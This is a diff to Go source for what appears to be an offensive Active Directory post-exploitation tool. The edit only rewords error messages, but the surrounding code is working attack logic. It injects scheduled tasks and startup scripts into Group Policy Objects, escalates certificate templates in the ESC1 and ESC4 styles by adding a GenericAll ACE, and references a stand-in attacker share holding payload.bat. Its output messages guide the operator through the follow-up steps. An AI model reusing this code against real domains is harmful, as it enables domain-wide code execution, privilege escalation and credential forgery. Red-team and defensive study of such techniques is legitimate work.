@@ -18,16 +18,16 @@ import (
 // MITRE ATT&CK: T1484.001 (Domain Policy Modification: Group Policy Modification)
 func ldapGPOAddTask(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.CommandResult {
 	if args.Target == "" {
-		return errorResult("Error: -target is required (GPO display name or DN)")
+		return errorResult("-target is required (GPO display name or DN)")
 	}
 	if args.Value == "" {
-		return errorResult("Error: -value is required (scheduled task XML or command to execute)")
+		return errorResult("-value is required (scheduled task XML or command to execute)")
 	}
 
 	// Resolve GPO DN
 	gpoDN, err := resolveGPODN(conn, args.Target, baseDN)
 	if err != nil {
-		return errorf("Error resolving GPO: %v", err)
+		return errorf("resolving GPO: %v", err)
 	}
 
 	// Read current GPO attributes
@@ -39,7 +39,7 @@ func ldapGPOAddTask(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.
 	)
 	sr, err := conn.Search(searchReq)
 	if err != nil || len(sr.Entries) == 0 {
-		return errorf("Error reading GPO %s: %v", gpoDN, err)
+		return errorf("reading GPO %s: %v", gpoDN, err)
 	}
 	entry := sr.Entries[0]
 
@@ -73,7 +73,7 @@ func ldapGPOAddTask(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.
 	modReq.Replace("versionNumber", []string{fmt.Sprintf("%d", newVersion)})
 
 	if err := conn.Modify(modReq); err != nil {
-		return errorf("Error modifying GPO: %v", err)
+		return errorf("modifying GPO: %v", err)
 	}
 
 	return successf("GPO task injection prepared:\n  GPO:      %s (%s)\n  DN:       %s\n  Command:  %s\n  Version:  %d → %d (machine version incremented)\n  CSE:      Scheduled Task Extension added\n\n  IMPORTANT: You must also write the scheduled task XML to SYSVOL:\n    \\\\<domain>\\SYSVOL\\<domain>\\Policies\\<GUID>\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml\n  Use 'smb -action push' to write the XML file to the SYSVOL share.",
@@ -84,15 +84,15 @@ func ldapGPOAddTask(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.
 // Modifies gPCMachineExtensionNames and the GPO version to trigger reprocessing.
 func ldapGPOAddScript(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.CommandResult {
 	if args.Target == "" {
-		return errorResult("Error: -target is required (GPO display name or DN)")
+		return errorResult("-target is required (GPO display name or DN)")
 	}
 	if args.Value == "" {
-		return errorResult("Error: -value is required (script path, e.g., \\\\attacker\\share\\payload.bat)")
+		return errorResult("-value is required (script path, e.g., \\\\attacker\\share\\payload.bat)")
 	}
 
 	gpoDN, err := resolveGPODN(conn, args.Target, baseDN)
 	if err != nil {
-		return errorf("Error resolving GPO: %v", err)
+		return errorf("resolving GPO: %v", err)
 	}
 
 	searchReq := ldap.NewSearchRequest(
@@ -103,7 +103,7 @@ func ldapGPOAddScript(conn *ldap.Conn, args ldapWriteArgs, baseDN string) struct
 	)
 	sr, err := conn.Search(searchReq)
 	if err != nil || len(sr.Entries) == 0 {
-		return errorf("Error reading GPO: %v", err)
+		return errorf("reading GPO: %v", err)
 	}
 	entry := sr.Entries[0]
 
@@ -131,7 +131,7 @@ func ldapGPOAddScript(conn *ldap.Conn, args ldapWriteArgs, baseDN string) struct
 	modReq.Replace("versionNumber", []string{fmt.Sprintf("%d", newVersion)})
 
 	if err := conn.Modify(modReq); err != nil {
-		return errorf("Error modifying GPO: %v", err)
+		return errorf("modifying GPO: %v", err)
 	}
 
 	return successf("GPO script injection prepared:\n  GPO:      %s (%s)\n  DN:       %s\n  Script:   %s\n  Version:  %d → %d\n  CSE:      Scripts Extension added\n\n  IMPORTANT: Write scripts.ini to SYSVOL:\n    \\\\<domain>\\SYSVOL\\<domain>\\Policies\\<GUID>\\Machine\\Scripts\\Startup\\scripts.ini\n  Format: [Startup]\\n0CmdLine=%s\\n0Parameters=\n  Use 'smb -action push' to write the ini file.",
@@ -144,7 +144,7 @@ func ldapGPOAddScript(conn *ldap.Conn, args ldapWriteArgs, baseDN string) struct
 // MITRE ATT&CK: T1649 (Steal or Forge Authentication Certificates)
 func ldapTemplateESC1(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.CommandResult {
 	if args.Target == "" {
-		return errorResult("Error: -target is required (certificate template CN)")
+		return errorResult("-target is required (certificate template CN)")
 	}
 
 	templateDN := fmt.Sprintf("CN=%s,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,%s", args.Target, baseDN)
@@ -158,7 +158,7 @@ func ldapTemplateESC1(conn *ldap.Conn, args ldapWriteArgs, baseDN string) struct
 	)
 	sr, err := conn.Search(searchReq)
 	if err != nil || len(sr.Entries) == 0 {
-		return errorf("Error reading certificate template '%s': %v\n  DN: %s", args.Target, err, templateDN)
+		return errorf("reading certificate template '%s': %v\n  DN: %s", args.Target, err, templateDN)
 	}
 	entry := sr.Entries[0]
 
@@ -198,7 +198,7 @@ func ldapTemplateESC1(conn *ldap.Conn, args ldapWriteArgs, baseDN string) struct
 	}
 
 	if err := conn.Modify(modReq); err != nil {
-		return errorf("Error modifying certificate template: %v", err)
+		return errorf("modifying certificate template: %v", err)
 	}
 
 	var sb strings.Builder
@@ -223,10 +223,10 @@ func ldapTemplateESC1(conn *ldap.Conn, args ldapWriteArgs, baseDN string) struct
 // MITRE ATT&CK: T1649 (Steal or Forge Authentication Certificates)
 func ldapTemplateESC4(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.CommandResult {
 	if args.Target == "" {
-		return errorResult("Error: -target is required (certificate template CN)")
+		return errorResult("-target is required (certificate template CN)")
 	}
 	if args.Value == "" {
-		return errorResult("Error: -value is required (principal SID or sAMAccountName to grant access)")
+		return errorResult("-value is required (principal SID or sAMAccountName to grant access)")
 	}
 
 	templateDN := fmt.Sprintf("CN=%s,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,%s", args.Target, baseDN)
@@ -234,7 +234,7 @@ func ldapTemplateESC4(conn *ldap.Conn, args ldapWriteArgs, baseDN string) struct
 	// Resolve principal to SID
 	principalSID, err := resolveToSID(conn, args.Value, baseDN)
 	if err != nil {
-		return errorf("Error resolving principal '%s': %v", args.Value, err)
+		return errorf("resolving principal '%s': %v", args.Value, err)
 	}
 
 	// Read current nTSecurityDescriptor
@@ -250,7 +250,7 @@ func ldapTemplateESC4(conn *ldap.Conn, args ldapWriteArgs, baseDN string) struct
 	)
 	sr, err := conn.Search(searchReq)
 	if err != nil || len(sr.Entries) == 0 {
-		return errorf("Error reading template security descriptor: %v", err)
+		return errorf("reading template security descriptor: %v", err)
 	}
 	entry := sr.Entries[0]
 	displayName := entry.GetAttributeValue("displayName")
@@ -260,7 +260,7 @@ func ldapTemplateESC4(conn *ldap.Conn, args ldapWriteArgs, baseDN string) struct
 
 	currentSD := entry.GetRawAttributeValue("nTSecurityDescriptor")
 	if len(currentSD) == 0 {
-		return errorResult("Error: cannot read nTSecurityDescriptor — insufficient privileges")
+		return errorResult("cannot read nTSecurityDescriptor — insufficient privileges")
 	}
 
 	// Build ACE for GenericAll (0x10000000) + Enroll (0x00000004)
@@ -271,7 +271,7 @@ func ldapTemplateESC4(conn *ldap.Conn, args ldapWriteArgs, baseDN string) struct
 	// Append ACE to existing DACL
 	newSD := appendACEToDACL(currentSD, ace)
 	if newSD == nil {
-		return errorResult("Error: could not parse security descriptor to add ACE")
+		return errorResult("could not parse security descriptor to add ACE")
 	}
 
 	modReq := ldap.NewModifyRequest(templateDN, []ldap.Control{
@@ -284,7 +284,7 @@ func ldapTemplateESC4(conn *ldap.Conn, args ldapWriteArgs, baseDN string) struct
 	modReq.Replace("nTSecurityDescriptor", []string{string(newSD)})
 
 	if err := conn.Modify(modReq); err != nil {
-		return errorf("Error modifying template ACL: %v", err)
+		return errorf("modifying template ACL: %v", err)
 	}
 
 	return successf("ESC4: Granted full control on certificate template:\n  Template:   %s\n  DN:         %s\n  Principal:  %s (SID: %s)\n  Rights:     GenericAll + Enroll\n\n  Attack: Modify the template for ESC1, then request certs as any user.\n  Use 'ldap-write -action template-esc1 -target %s' to set up ESC1.",
